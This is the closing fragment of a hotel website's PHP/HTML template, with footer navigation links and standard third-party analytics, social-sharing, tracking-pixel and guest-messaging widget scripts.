        <a href="https://jademountain.com/news-reviews/news.html"><span>News</span></a>
<a href="https://jademountain.com/news-reviews/in-the-press.html"><span>In The Press</span></a>
        <a href="https://jademountain.com/news-reviews/awards_and_reviews.html"><span>Awards</span></a>
        <a href="https://jademountain.com/news-reviews/press.html"><span>Press Information</span></a>
        <a href="https://jademountain.com/news-reviews/testimonials.html"><span>Testimonials</span></a>
        <a href="https://jademountain.com/blog"><span>Blog</span></a>
      </div>

    </div>

  </div>
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-58dd5d7487a776fa"></script>

<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-1685435-2', 'auto', {'allowLinker': true});
ga('require', 'linker');
ga('linker:autoLink', ['gc.synxis.com'] );
ga('send', 'pageview');

</script>
<script src="https://paperboy.triptease.net/87JyKBGQDo.js?hotelkey=9b282c605de42549598aa8ea2ccab1b8d5423eb7"></script>

<!-- Go to www.addthis.com/dashboard to customize your tools -->
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-58dd5d7487a776fa"></script>

<!-- Facebook Pixel -->

<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1066355493472644'); // Insert your pixel ID here.
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1066355493472644&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<!-- Google Tag Manager -->

<!--<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-T2DGRR7');</script>-->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-1685435-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-1685435-2');
</script>

<!-- End Google Tag Manager -->
<!-- GuestConnexxion Widget Code -->
<script src="https://widget.guestconnexxion.com/app.js"></script>
<script type="text/javascript">
	GuestConnexxion("init", {
		app_id: "c5915d3d40b628732fdbcdc10d89dc98"
	});
</script>
<!-- GuestConnexxion Widget Code -->
</body>

</html>
<?php
}
 ?>
